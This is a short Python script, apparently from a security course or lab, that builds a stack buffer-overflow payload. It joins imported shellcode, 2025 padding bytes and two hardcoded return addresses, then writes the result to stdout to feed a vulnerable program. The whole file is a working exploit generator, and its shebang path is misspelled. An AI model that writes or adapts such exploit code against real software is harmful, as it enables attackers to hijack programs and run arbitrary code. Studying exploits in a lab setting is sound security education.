#!/user/bin/env python3

import sys
from shellcode import shellcode

vulnAdd = b'\x8c\xe8\xfe\xff'  
shellAdd = b'\x78\xe0\xfe\xff'
payload = ( b'a'*2025 + shellAdd + vulnAdd )

sys.stdout.buffer.write( shellcode  + payload )